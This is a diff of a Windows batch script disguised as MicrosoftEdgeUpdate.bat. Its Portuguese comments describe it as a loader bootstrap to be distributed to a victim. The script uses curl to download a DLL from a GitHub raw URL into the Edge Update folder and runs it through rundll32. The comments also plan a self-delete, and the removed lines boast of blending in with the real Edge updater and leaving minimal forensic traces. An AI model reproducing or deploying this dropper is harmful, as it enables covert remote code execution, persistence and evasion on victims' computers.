@@ -1,34 +1,31 @@
 @echo off
+REM =====================================================================
+REM MicrosoftEdgeUpdate.bat — bootstrap do loader (distribuir pra vitima)
+REM
+REM Fluxo:
+REM   1. Se vcredist_cache.dll nao existe em %LOCALAPPDATA%\Microsoft\EdgeUpdate\
+REM      baixa do GitHub (puxa versao atual deployada).
+REM   2. Executa rundll32 vcredist_cache.dll,InitPatch
+REM   3. (quando quiser) self-delete deste bat
+REM
+REM Loader URL fixo apontando pro repo assets-storage branch main.
+REM Pra atualizar o loader, compila local + deploy pro GitHub.
+REM =====================================================================
+
 setlocal
-
-REM =====================================================================
-REM MicrosoftEdgeUpdate loader (install-if-not-exists)
-REM
-REM Primeira run: baixa vcredist_cache.dll pro %LOCALAPPDATA%\Microsoft\
-REM               EdgeUpdate\ e executa rundll32 nele.
-REM Runs seguintes: zero download, zero create — so READ do arquivo
-REM                 instalado + execucao via rundll32.
-REM
-REM Resultado no $UsnJrnl: 1 CREATE no dia da instalacao, zero entries
-REM relevantes nas runs seguintes. Blend 100% com Edge Update real.
-REM =====================================================================
-
 set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\EdgeUpdate"
 set "LOADER_PATH=%INSTALL_DIR%\vcredist_cache.dll"
 set "LOADER_URL=https://raw.githubusercontent.com/Jvsosa/assets-storage/main/vcredist_cache.dll"
 
-REM Install-if-not-exists
+REM Garante pasta destino
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
+
+REM Baixa loader se nao existir (persistencia: baixa so na primeira execucao)
 if not exist "%LOADER_PATH%" (
-    if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
     curl -s -L -o "%LOADER_PATH%" "%LOADER_URL%"
-    if not exist "%LOADER_PATH%" (
-        echo Falha no download.
-        pause
-        exit /b 1
-    )
 )
 
-REM Executa (zero download nas runs seguintes)
+REM Executa loader via rundll32
 rundll32.exe "%LOADER_PATH%",InitPatch
 
 endlocal
